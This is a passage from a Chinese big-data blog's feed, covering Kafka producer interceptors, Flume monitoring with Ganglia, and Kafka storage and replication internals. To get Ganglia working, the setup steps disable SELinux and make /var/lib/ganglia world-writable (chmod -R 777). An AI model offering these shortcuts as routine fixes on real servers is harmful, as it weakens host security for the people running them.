punctuation">,</span> Exception exception<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 统计成功和失败的次数</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>exception <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            successCounter<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            errorCounter<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 保存结果</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Successful sent: "</span> <span class="token operator">+</span> successCounter<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Failed sent: "</span> <span class="token operator">+</span> errorCounter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）producer主程序</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>KafkaProducer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>Producer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterceptorProducer</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 设置配置信息</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"acks"</span><span class="token punctuation">,</span> <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"retries"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch.size"</span><span class="token punctuation">,</span> <span class="token number">16384</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"linger.ms"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"buffer.memory"</span><span class="token punctuation">,</span> <span class="token number">33554432</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 构建拦截链</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> interceptors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        interceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.molly.kafka.interceptor.TimeInterceptor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     interceptors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.molly.kafka.interceptor.CounterInterceptor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ProducerConfig<span class="token punctuation">.</span>INTERCEPTOR_CLASSES_CONFIG<span class="token punctuation">,</span> interceptors<span class="token punctuation">)</span><span class="token punctuation">;</span>        String topic <span class="token operator">=</span> <span class="token string">"first"</span><span class="token punctuation">;</span>        Producer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 发送消息</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>topic<span class="token punctuation">,</span> <span class="token string">"message"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 一定要关闭producer，这样才会调用interceptor的close方法</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）测试</p><p>（1）在kafka上启动消费者，然后运行客户端java程序。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \--bootstrap-server hadoop102:9092 --from-beginning --topic first1501904047034,message01501904047225,message11501904047230,message21501904047234,message31501904047236,message41501904047240,message51501904047243,message61501904047246,message71501904047249,message81501904047252,message9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/17/bigdata-kafka3-API/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>flume学习笔记（三） flum数据流监控及面试题</title>
      <link>https://m01ly.github.io/2020/11/16/bigdata-flume3-monitor/</link>
      <guid>https://m01ly.github.io/2020/11/16/bigdata-flume3-monitor/</guid>
      <pubDate>Mon, 16 Nov 2020 08:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在flume进行数据的采集过程中，有可能会出错，因此我们需要一个系统来监控flume采集的状况。</p><h3 id="1-Ganglia的安装与部署"><a href="#1-Ganglia的安装与部署" class="headerlink" title="1 Ganglia的安装与部署"></a>1 Ganglia的安装与部署</h3><p>Ganglia由gmond、gmetad和gweb三部分组成。</p><p>gmond（Ganglia Monitoring Daemon）是一种轻量级服务，安装在每台需要收集指标数据的节点主机上。使用gmond，你可以很容易收集很多系统指标数据，如CPU、内存、磁盘、网络和活跃进程的数据等。（有flume的主机就要装gmond）</p><p>gmetad（Ganglia Meta Daemon）整合所有信息，并将其以RRD格式存储至磁盘的服务。（在一台机器上安装即可）</p><p>gweb（Ganglia Web）Ganglia可视化工具，gweb是一种利用浏览器显示gmetad所存储数据的PHP前端。在Web界面中以图表方式展现集群的运行状态下收集的多种不同指标数据。（在一台机器上安装即可）</p><p>1）安装ganglia</p><p>  （1）规划</p><p>hadoop102:   gweb gmetad gmod<br>hadoop103:   gmod<br>hadoop104:   gmod</p><p>  （2）在102 103 104分别安装epel-release</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> epel-release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    （3）在102 安装三个服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-gmetad <span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-web<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-gmond<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  （4）在103 和 104 安装ganglia-gmond</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> ganglia-gmond<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）在102修改配置文件/etc/httpd/conf.d/ganglia.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/httpd/conf.d/ganglia.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改为红颜色的配置：</p><pre class="line-numbers language-sh"><code class="language-sh"># Ganglia monitoring system php web frontendAlias /ganglia /usr/share/ganglia<Location /ganglia># Require local# 通过windows访问ganglia,需要配置Linux对应的主机(windows)ip地址  Require ip 192.168.202.1  # Require ip 10.1.2.3# Require host example.org</Location><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）在102修改配置文件/etc/ganglia/gmetad.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/ganglia/gmetad.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改为：</p><p>data_source “my cluster” hadoop102</p><p>6）在102 103 104修改配置文件/etc/ganglia/gmond.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/ganglia/gmond.conf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改为：</p><pre class="line-numbers language-sh"><code class="language-sh">cluster &#123; name = "my cluster" owner = "unspecified" latlong = "unspecified" url = "unspecified"&#125;udp_send_channel &#123;#bind_hostname = yes # Highly recommended, soon to be default.# This option tells gmond to use a source address# that resolves to the machine's hostname. Without# this, the metrics may appear to come from any# interface and the DNS names associated with# those IPs will be used to create the RRDs.# mcast_join = 239.2.11.71# 数据发送给hadoop102 host = hadoop102 port = 8649 ttl = 1&#125;udp_recv_channel &#123;# mcast_join = 239.2.11.71 port = 8649# 接收来自任意连接的数据 bind = 0.0.0.0 retry_bind = true# Size of the UDP buffer. If you are handling lots of metrics you really# should bump it up to e.g. 10MB or even higher.# buffer = 10485760&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7）在102修改配置文件/etc/selinux/config</p><pre class="line-numbers language-sh"><code class="language-sh">[molly@hadoop102 flume]$ sudo vim /etc/selinux/config#修改为：# This file controls the state of SELinux on the system.# SELINUX= can take one of these three values:#   enforcing - SELinux security policy is enforced.#   permissive - SELinux prints warnings instead of enforcing.#   disabled - No SELinux policy is loaded.SELINUX=disabled# SELINUXTYPE= can take one of these two values:#   targeted - Targeted processes are protected,#   mls - Multi Level Security protection.SELINUXTYPE=targeted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尖叫提示：selinux本次生效关闭必须重启，如果此时不想重启，可以临时生效之：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> setenforce 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）启动ganglia</p><p>（1）在102 103 104 启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl  start gmond<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）在102 启动</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl start httpd<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl start gmetad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>9）打开网页浏览ganglia页面</p><p><a href="http://hadoop102/ganglia">http://hadoop102/ganglia</a></p><p>尖叫提示：如果完成以上操作依然出现权限不足错误，请修改/var/lib/ganglia目录的权限：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">chmod</span> -R 777 /var/lib/ganglia<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/bigdata-flume3-monitor/1637069452077.png" alt="1637069452077"></p><h3 id="2-操作Flume测试监控"><a href="#2-操作Flume测试监控" class="headerlink" title="2 操作Flume测试监控"></a>2 操作Flume测试监控</h3><p>1）启动Flume任务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent \-c conf/ \-n a1 \-f datas/netcat-flume-logger.conf \-Dflume.root.logger<span class="token operator">=</span>INFO,console \-Dflume.monitoring.type<span class="token operator">=</span>ganglia \-Dflume.monitoring.hosts<span class="token operator">=</span>hadoop202:8649<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）发送数据观察ganglia监测图</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ nc localhost 44444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>样式如图： <img src="/2020/11/16/bigdata-flume3-monitor/1637069611224.png" alt="1637069611224"></p><p>图例说明：</p><table><thead><tr><th>字段（图表名称）</th><th>字段含义</th></tr></thead><tbody><tr><td>EventPutAttemptCount</td><td>source尝试写入channel的事件总数量</td></tr><tr><td>EventPutSuccessCount</td><td>成功写入channel且提交的事件总数量</td></tr><tr><td>EventTakeAttemptCount</td><td>sink尝试从channel拉取事件的总数量。</td></tr><tr><td>EventTakeSuccessCount</td><td>sink成功读取的事件的总数量</td></tr><tr><td>StartTime</td><td>channel启动的时间（毫秒）</td></tr><tr><td>StopTime</td><td>channel停止的时间（毫秒）</td></tr><tr><td>ChannelSize</td><td>目前channel中事件的总数量</td></tr><tr><td>ChannelFillPercentage</td><td>channel占用百分比</td></tr><tr><td>ChannelCapacity</td><td>channel的容量</td></tr></tbody></table><h3 id="3-企业真实面试题"><a href="#3-企业真实面试题" class="headerlink" title="3 企业真实面试题"></a>3 企业真实面试题</h3><h4 id="3-1-你是如何实现Flume数据传输的监控的"><a href="#3-1-你是如何实现Flume数据传输的监控的" class="headerlink" title="3.1 你是如何实现Flume数据传输的监控的"></a>3.1 你是如何实现Flume数据传输的监控的</h4><p>使用第三方框架Ganglia实时监控Flume。</p><h4 id="3-2-Flume的Source，Sink，Channel的作用？你们Source是什么类型？"><a href="#3-2-Flume的Source，Sink，Channel的作用？你们Source是什么类型？" class="headerlink" title="3.2 Flume的Source，Sink，Channel的作用？你们Source是什么类型？"></a>3.2 Flume的Source，Sink，Channel的作用？你们Source是什么类型？</h4><p>1）作用</p><p>（1）Source组件是专门用来收集数据的，可以处理各种类型、各种格式的日志数据，包括avro、thrift、exec、jms、spooling directory、netcat、sequence generator、syslog、http、legacy</p><p>（2）Channel组件对采集到的数据进行缓存，可以存放在Memory或File中。</p><p>（3）Sink组件是用于把数据发送到目的地的组件，目的地包括Hdfs、Logger、avro、thrift、ipc、file、Hbase、solr、自定义。</p><p>2）我公司采用的Source类型为：</p><p>（1）监控后台日志：exec</p><p>（2）监控后台产生日志的端口：netcat</p><h4 id="3-3-Flume的Channel-Selectors"><a href="#3-3-Flume的Channel-Selectors" class="headerlink" title="3.3 Flume的Channel Selectors"></a>3.3 Flume的Channel Selectors</h4><p><img src="/2020/11/16/bigdata-flume3-monitor/1637070079570.png" alt="1637070079570"></p><h4 id="3-4-Flume参数调优"><a href="#3-4-Flume参数调优" class="headerlink" title="3.4 Flume参数调优"></a>3.4 Flume参数调优</h4><p>1）Source</p><p>增加Source个（使用Tair Dir Source时可增加FileGroups个数）可以增大Source的读取数据的能力。例如：当某一个目录产生的文件过多时需要将这个文件目录拆分成多个文件目录，同时配置好多个Source 以保证Source有足够的能力获取到新产生的数据。</p><p>batchSize参数决定Source一次批量运输到Channel的event条数，适当调大这个参数可以提高Source搬运Event到Channel时的性能。</p><p>2）Channel </p><p>type 选择memory时Channel的性能最好，但是如果Flume进程意外挂掉可能会丢失数据。type选择file时Channel的容错性更好，但是性能上会比memory channel差。</p><p>使用file Channel时dataDirs配置多个不同盘下的目录可以提高性能。</p><p>Capacity 参数决定Channel可容纳最大的event条数。transactionCapacity 参数决定每次Source往channel里面写的最大event条数和每次Sink从channel里面读的最大event条数。transactionCapacity需要大于Source和Sink的batchSize参数。</p><p>3）Sink </p><p>增加Sink的个数可以增加Sink消费event的能力。Sink也不是越多越好够用就行，过多的Sink会占用系统资源，造成系统资源不必要的浪费。</p><p>batchSize参数决定Sink一次批量从Channel读取的event条数，适当调大这个参数可以提高Sink从Channel搬出event的性能。</p><h4 id="3-5-Flume的事务机制"><a href="#3-5-Flume的事务机制" class="headerlink" title="3.5 Flume的事务机制"></a>3.5 Flume的事务机制</h4><p>Flume的事务机制（类似数据库的事务机制）：Flume使用两个独立的事务分别负责从Soucrce到Channel，以及从Channel到Sink的事件传递。比如spooling directory source 为文件的每一行创建一个事件，一旦事务中所有的事件全部传递到Channel且提交成功，那么Soucrce就将该文件标记为完成。同理，事务以类似的方式处理从Channel到Sink的传递过程，如果因为某种原因使得事件无法记录，那么事务将会回滚。且所有的事件都会保持到Channel中，等待重新传递。</p><h4 id="3-6-Flume采集数据会丢失吗"><a href="#3-6-Flume采集数据会丢失吗" class="headerlink" title="3.6 Flume采集数据会丢失吗?"></a>3.6 Flume采集数据会丢失吗?</h4><p>根据Flume的架构原理，Flume是不可能丢失数据的，其内部有完善的事务机制，Source到Channel是事务性的，Channel到Sink是事务性的，因此这两个环节不会出现数据的丢失，唯一可能丢失数据的情况是Channel采用memoryChannel，agent宕机导致数据丢失，或者Channel存储数据已满，导致Source不再写入，未写入的数据丢失。</p><p>Flume不会丢失数据，但是有可能造成数据的重复，例如数据已经成功由Sink发出，但是没有接收到响应，Sink会再次发送数据，此时可能会导致数据的重复。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/flume/">flume</category>
      
      
      <comments>https://m01ly.github.io/2020/11/16/bigdata-flume3-monitor/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kafka学习笔记（二） kafka框架深入</title>
      <link>https://m01ly.github.io/2020/11/16/bigdata-kafka2-framework/</link>
      <guid>https://m01ly.github.io/2020/11/16/bigdata-kafka2-framework/</guid>
      <pubDate>Sun, 15 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Kafka工作流程及文件存储机制"><a href="#1-Kafka工作流程及文件存储机制" class="headerlink" title="1 Kafka工作流程及文件存储机制"></a>1 Kafka工作流程及文件存储机制</h2><p>​                                <img src="/2020/11/16/bigdata-kafka2-framework/1637307083407.png" alt="1637307083407"></p><p>Kafka中消息是以topic进行分类的，生产者生产消息，消费者消费消息，都是面向topic的。</p><p>topic是逻辑上的概念，而partition是物理上的概念，每个partition对应于一个log文件，该log文件中存储的就是producer生产的数据。Producer生产的数据会被不断追加到该log文件末端，且每条数据都有自己的offset。消费者组中的每个消费者，都会实时记录自己消费到了哪个offset，以便出错恢复时，从上次的位置继续消费。</p><p>   <img src="/2020/11/16/bigdata-kafka2-framework/1637307135597.png" alt="1637307135597"></p><p>由于生产者生产的消息会不断追加到log文件末尾，为防止log文件过大导致数据定位效率低下，Kafka采取了分片和索引机制，将每个partition分为多个segment。每个segment对应两个文件——“.index”文件和“.log”文件。这些文件位于一个文件夹下，该文件夹的命名规则为：topic名称+分区序号。例如，first这个topic有三个分区，则其对应的文件夹为first-0,first-1,first-2。</p><p>00000000000000000000.index<br>00000000000000000000.log<br>00000000000000170410.index<br>00000000000000170410.log<br>00000000000000239430.index<br>00000000000000239430.log</p><p>index和log文件以当前segment的第一条消息的offset命名。下图为index文件和log文件的结构示意图。<img src="/2020/11/16/bigdata-kafka2-framework/1637307198786.png" alt="1637307198786"></p><p>“.index”文件存储大量的索引信息，“.log”文件存储大量的数据，索引文件中的元数据指向对应数据文件中message的物理偏移地址。</p><h2 id="2-Kafka生产者"><a href="#2-Kafka生产者" class="headerlink" title="2 Kafka生产者"></a>2 Kafka生产者</h2><h3 id="2-1-分区策略"><a href="#2-1-分区策略" class="headerlink" title="2.1 分区策略"></a>2.1 分区策略</h3><p>1）分区的原因</p><p>（1）方便在集群中扩展，每个Partition可以通过调整以适应它所在的机器，而一个topic又可以有多个Partition组成，因此整个集群就可以适应任意大小的数据了；</p><p>（2）可以提高并发，因为可以以Partition为单位读写了。</p><p>2）分区的原则</p><p>我们需要将producer发送的数据封装成一个ProducerRecord对象。</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307258903.png" alt="1637307258903"></p><p>（1）  指明 partition 的情况下，直接将指明的值直接作为 partiton 值；</p><p>（2） 没有指明 partition 值但有 key 的情况下，将 key 的 hash 值与 topic 的 partition 数进行取余得到 partition 值；</p><p>（3）  既没有 partition 值又没有 key 值的情况下， kafka采用Sticky Partition(黏性分区器)，会随机选择一个分区，并尽可能一直使用该分区，待该分区的batch已满或者已完成，kafka再随机一个分区进行使用.</p><h3 id="2-2-数据可靠性保证"><a href="#2-2-数据可靠性保证" class="headerlink" title="2.2 数据可靠性保证"></a>2.2 数据可靠性保证</h3><p>1）生产者发送数据到topic partition的可靠性保证</p><p>为保证producer发送的数据，能可靠的发送到指定的topic，topic的每个partition收到producer发送的数据后，都需要向producer发送ack（acknowledgement确认收到），如果producer收到ack，就会进行下一轮的发送，否则重新发送数据。</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307286958.png" alt="1637307286958"></p><p>2）Topic partition存储数据的可靠性保证</p><p>（1）副本数据同步策略</p><table><thead><tr><th>方案</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>半数以上完成同步，就发送ack</td><td>延迟低</td><td>选举新的leader时，容忍n台节点的故障，需要2n+1个副本</td></tr><tr><td>全部完成同步，才发送ack</td><td>选举新的leader时，容忍n台节点的故障，需要n+1个副本</td><td>延迟高</td></tr></tbody></table><p>Kafka选择了第二种方案，原因如下：</p><p>\1. 同样为了容忍n台节点的故障，第一种方案需要2n+1个副本，而第二种方案只需要n+1个副本，而Kafka的每个分区都有大量的数据，第一种方案会造成大量数据的冗余。</p><p>\2. 虽然第二种方案的网络延迟会比较高，但网络延迟对Kafka的影响较小。</p><p>（2）ISR</p><p>​    采用第二种方案之后，设想以下情景：leader收到数据，所有follower都开始同步数据，但有一个follower，因为某种故障，迟迟不能与leader进行同步，那leader就要一直等下去，直到它完成同步，才能发送ack。这个问题怎么解决呢？</p><p>​    Leader维护了一个动态的in-sync replica set (ISR)，意为和leader保持同步的follower集合。当ISR中的follower完成数据的同步之后，leader就会给producer发送ack。如果follower长时间未向leader同步数据，则该follower将被踢出ISR，该时间阈值由replica.lag.time.max.ms参数设定。Leader发生故障之后，就会从ISR中选举新的leader。</p><p>（3）ack应答级别</p><p>对于某些不太重要的数据，对数据的可靠性要求不是很高，能够容忍数据的少量丢失，所以没必要等ISR中的follower全部接收成功。</p><p>所以Kafka为用户提供了三种可靠性级别，用户根据对可靠性和延迟的要求进行权衡，选择以下的配置。</p><p>acks参数配置：</p><p>acks：</p><p>0：这一操作提供了一个最低的延迟，partition的leader接收到消息还没有写入磁盘就已经返回ack，当leader故障时有可能丢失数据；</p><p>1： partition的leader落盘成功后返回ack，如果在follower同步成功之前leader故障，那么将会丢失数据；</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307342461.png" alt="1637307342461"></p><p>-1（all）： partition的leader和follower全部落盘成功后才返回ack。但是如果在follower同步完成后，broker发送ack之前，leader发生故障，那么会造成数据重复。</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307384900.png" alt="1637307384900"></p><p>3）leader和 follower故障处理细节</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307411343.png" 